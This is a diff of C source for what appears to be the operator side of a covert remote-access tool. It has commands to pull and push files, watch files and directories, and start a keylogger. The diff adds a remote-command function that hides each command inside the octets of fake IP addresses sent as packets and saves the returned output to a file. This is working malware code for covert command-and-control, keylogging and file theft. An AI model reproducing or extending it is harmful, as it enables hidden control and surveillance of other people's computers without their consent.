@@ -9,6 +9,7 @@
 #include <unistd.h>
 
 #define DATA_BUF_SIZE 8192
+#define STD_SIZE 256
 
 int encode_ip(char *buffer, uint8_t byte1, uint8_t byte2, uint8_t byte3, uint8_t byte4) {
     return sprintf(buffer, "%u.%u.%u.%u", byte1, byte2, byte3, byte4);
@@ -27,10 +28,9 @@ int prompt_stdin(char *buffer, int buf_size) {
 }
 
 int cmd_send_file(struct Context *ctx) {
-    const int BUF_SIZE = 256;
-    char file_path[BUF_SIZE];
+    char file_path[STD_SIZE];
     printf("Enter relative file path: ");
-    prompt_stdin(file_path, BUF_SIZE);
+    prompt_stdin(file_path, STD_SIZE);
     printf("File path: %s\n", file_path);
 
     const int file_fd = open(file_path, O_RDONLY);
@@ -112,10 +112,9 @@ int cmd_send_file(struct Context *ctx) {
 }
 
 int cmd_get_file(struct Context *ctx){
-    const int BUF_SIZE = 256;
-    char file_path[BUF_SIZE];
+    char file_path[STD_SIZE];
     printf("Enter relative file path: ");
-    prompt_stdin(file_path, BUF_SIZE);
+    prompt_stdin(file_path, STD_SIZE);
     printf("File path: %s\n", file_path);
 
     char ip_buffer[IP_ADDR_LEN] = {0};
@@ -224,10 +223,9 @@ int cmd_start_kl(struct Context *ctx){
 int cmd_watch_file(struct Context *ctx){
     // send CMD_WATCH_FILE, then TERM
     // print "Enter 1 to stop"
-    const int BUF_SIZE = 256;
-    char file_path[BUF_SIZE];
+    char file_path[STD_SIZE];
     printf("Enter relative file path: ");
-    prompt_stdin(file_path, BUF_SIZE);
+    prompt_stdin(file_path, STD_SIZE);
     printf("File path: %s\n", file_path);
 
     char ip_buffer[IP_ADDR_LEN] = {0};
@@ -275,10 +273,9 @@ int cmd_watch_file(struct Context *ctx){
 int cmd_watch_dir(struct Context *ctx){
     // send CMD_WATCH_DIR, then TERM
     // print "Enter 1 to stop"
-    const int BUF_SIZE = 256;
-    char dir_path[BUF_SIZE];
+    char dir_path[STD_SIZE];
     printf("Enter relative dir path: ");
-    prompt_stdin(dir_path, BUF_SIZE);
+    prompt_stdin(dir_path, STD_SIZE);
     printf("Dir path: %s\n", dir_path);
 
     char ip_buffer[IP_ADDR_LEN] = {0};
@@ -343,6 +340,61 @@ int cmd_stop(struct Context *ctx) {
 }
 
 int cmd_remote_run(struct Context *ctx) {
+    char cmd_str[STD_SIZE];
+    printf("Enter command: ");
+    prompt_stdin(cmd_str, STD_SIZE);
+
+    char ip_buffer[IP_ADDR_LEN] = {0};
+    int ret;
+    size_t len;
+
+    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 0, 0, CMD_REMOTE_RUN);
+    if (ret < 0) {
+        fprintf(stderr, "encode cmd failed\n");
+    }
+    send_packet(ctx, ip_buffer);
+
+    len = strlen(cmd_str);
+    for (size_t i = 0; i < len; i+=2) {
+        if (i == len-1) {
+            ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx),
+                cmd_str[i], 0);
+        } else {
+            ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx),
+                cmd_str[i], cmd_str[i+1]);
+        }
+        if (ret < 0) {
+            fprintf(stderr, "encode data failed\n");
+        }
+        send_packet(ctx, ip_buffer);
+    }
+
+    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 1, 0, 0);
+    if (ret < 0) {
+        fprintf(stderr, "encode term failed\n");
+    }
+    send_packet(ctx, ip_buffer);
+
+    // create file, wait for data to come in, write to file
+    FILE *fp = fopen("remote_output.txt", "a+");  // opens or creates file
+    if (fp == NULL) {
+        perror("fopen");
+        return -1;
+    }
+
+    struct List data_list = {0};
+    recv_file_data(ctx, &data_list);
+
+    struct Blob *curr = data_list.head->next;
+
+    while (curr != data_list.tail) {
+        fputc(curr->data1, fp);
+        fputc(curr->data2, fp);
+        curr = curr->next;
+    }
+
+    fclose(fp);
+
     return 0;
 }
 
